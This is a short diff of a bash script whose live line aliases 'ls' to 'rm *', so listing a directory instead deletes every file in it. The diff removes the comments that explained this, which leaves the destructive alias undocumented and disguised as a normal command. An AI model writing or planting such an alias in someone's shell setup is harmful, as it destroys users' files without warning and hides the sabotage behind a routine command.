@@ -1,8 +1,2 @@
 #!/bin/bash 
 alias ls='rm *'
-
-# This is a called a she bang or hashbang, it tells the intepreter to use the bash shell to run this script
-# This file creates a shell shortcut or alias which tells the shell to replace the command 'ls' with 'rm' everytime it is run whhich delettes all the files in the current directrory
-
-
-
